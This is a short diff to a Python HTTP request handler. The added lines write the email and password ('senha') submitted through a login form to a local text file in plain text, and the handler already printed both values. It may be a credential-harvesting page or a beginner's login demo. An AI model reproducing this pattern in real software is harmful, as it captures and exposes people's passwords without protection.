@@ -43,6 +43,11 @@ class MyHandler(SimpleHTTPRequestHandler):
             print("Email: ", form_data.get('email', ['']) [0])
             print("Senha ", form_data.get('senha', ['']) [0])
 
+            with open('dados_login.txt', 'a') as file:
+                login = form_data.get('email', ['']) [0]
+                senha = form_data.get('senha',[''])[0]
+                file.write(f"{login};{senha}\n")
+
             self.send_response(200)
             self.send_header("Content-type", "text/html")
             self.end_headers()
